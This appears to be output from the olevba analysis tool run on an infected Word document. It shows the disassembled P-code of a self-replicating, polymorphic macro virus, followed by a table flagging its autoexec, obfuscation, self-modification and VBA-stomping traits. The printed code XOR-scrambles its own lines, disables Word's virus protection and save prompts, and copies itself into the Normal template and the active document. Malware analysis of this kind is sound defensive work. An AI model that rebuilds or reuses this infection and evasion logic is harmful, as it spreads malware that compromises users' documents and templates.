' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0014 "On Error Resume Next"
' 	St zom$ 
' 	EndIf 
' Line #162:
' Line #163:
' 	Ld num 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0021 "Application.ActiveWindow.Activate"
' 	St zom$ 
' 	EndIf 
' Line #164:
' Line #165:
' 	Ld num 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0020 "Options.SaveNormalPrompt = False"
' 	St zom$ 
' 	EndIf 
' Line #166:
' Line #167:
' 	Ld num 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0022 "Options.InsertedTextColor = wdAuto"
' 	St zom$ 
' 	EndIf 
' Line #168:
' Line #169:
' 	Ld num 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001D "Options.BackgroundSave = True"
' 	St zom$ 
' 	EndIf 
' Line #170:
' Line #171:
' 	Ld xz 
' 	Ld zom$ 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #172:
' Line #173:
' 	StartForVariable 
' 	Ld xz 
' 	EndForVariable 
' 	NextVar 
' Line #174:
' Line #175:
' 	LitDI2 0x0020 
' 	LitStr 0x0031 "'Zd0B SHi ZduB p0LyM0RHiC ENGiNe By ULTRAS/MATRiX"
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #176:
' Line #177:
' 	StartForVariable 
' 	Ld ZSZPE1 
' 	EndForVariable 
' 	LitDI2 0x0022 
' 	LitDI2 0x006A 
' 	For 
' Line #178:
' Line #179:
' 	LitVarSpecial (Null)
' 	St ZSZPE2 
' Line #180:
' Line #181:
' 	LitStr 0x0001 "'"
' 	Ld ZSZPE1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	Concat 
' 	St ZSZPE3 
' Line #182:
' Line #183:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St ZSZPE4 
' Line #184:
' Line #185:
' 	StartForVariable 
' 	Ld ZSZPE5 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ZSZPE3 
' 	FnLen 
' 	For 
' Line #186:
' Line #187:
' 	Ld ZSZPE3 
' 	Ld ZSZPE5 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld ZSZPE4 
' 	Xor 
' 	St ZSZPE6 
' Line #188:
' Line #189:
' 	Ld ZSZPE2 
' 	Ld ZSZPE6 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ZSZPE2 
' Line #190:
' Line #191:
' 	StartForVariable 
' 	Ld ZSZPE5 
' 	EndForVariable 
' 	NextVar 
' Line #192:
' Line #193:
' 	Ld ZSZPE2 
' 	St ZSZPE7 
' Line #194:
' Line #195:
' 	Ld ZSZPE1 
' 	LitStr 0x0001 "'"
' 	Ld ZSZPE7 
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #196:
' Line #197:
' 	StartForVariable 
' 	Ld ZSZPE1 
' 	EndForVariable 
' 	NextVar 
' Line #198:
' Line #199:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #200:
' Line #201:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #202:
' Line #203:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #204:
' Line #205:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St TD 
' Line #206:
' Line #207:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #208:
' Line #209:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #210:
' Line #211:
' 	Ld TD 
' 	Ld NT 
' 	ArgsMemCall AddFromString 0x0001 
' Line #212:
' Line #213:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set VA 
' Line #214:
' Line #215:
' 	LitDI2 0x0001 
' 	Ld VA 
' 	MemLd CountOfLines 
' 	Ld VA 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #216:
' Line #217:
' 	Ld TD 
' 	Ld VA 
' 	ArgsMemCall AddFromString 0x0001 
' Line #218:
' Line #219:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #220:
' Line #221:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |V8%                 |Vjgl                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

